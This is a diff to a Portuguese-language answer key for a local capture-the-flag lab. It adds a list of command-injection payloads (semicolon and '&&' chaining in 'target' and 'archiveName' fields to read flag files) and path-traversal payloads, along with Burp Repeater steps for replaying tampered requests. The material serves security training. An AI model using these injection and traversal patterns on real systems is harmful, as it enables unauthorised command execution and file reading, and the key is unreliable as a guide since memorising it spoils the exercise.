@@ -6,6 +6,17 @@ Gabarito tecnico completo. Use apenas no ambiente local autorizado:
 http://127.0.0.1:8090
 ```
 
+## Payloads principais
+
+```text
+target: 127.0.0.1; cat /app/flags/flag1.txt
+target: localhost && cat /app/flags/flag2.txt
+file: ../flags/flag3.txt
+file: ../flags/flag4.txt
+archiveName: backup.tar.gz; cat /app/flags/flag5.txt
+archiveName: backup.tar.gz; cat /app/flags/root.txt
+```
+
 ## Login
 
 Credenciais:
@@ -31,6 +42,7 @@ Fluxo manual:
 2. Capture a requisicao no Burp.
 3. Envie para Repeater.
 4. Altere apenas `target`.
+5. Compare a resposta normal com a resposta adulterada.
 
 Rota real:
 
@@ -111,6 +123,8 @@ Rota:
 ```text
 POST /api/assets/resolve
 ```
+
+No Burp Repeater, monte uma requisicao manual usando o mesmo cookie `session` recebido no login.
 
 Entrada normal:
 
@@ -202,6 +216,7 @@ support token middle: debug
 support token suffix: 2026
 backup route only exposed by internal healthcheck
 archived incident evidence moved outside data directory
+legacy resolver endpoint kept for support troubleshooting
 ```
 
 Token:
@@ -325,6 +340,8 @@ Body normal:
   "archiveName": "backup.tar.gz"
 }
 ```
+
+No Burp Repeater, crie a requisicao manualmente a partir dos metadados do health interno e mantenha o header de suporte.
 
 Flag5:
 
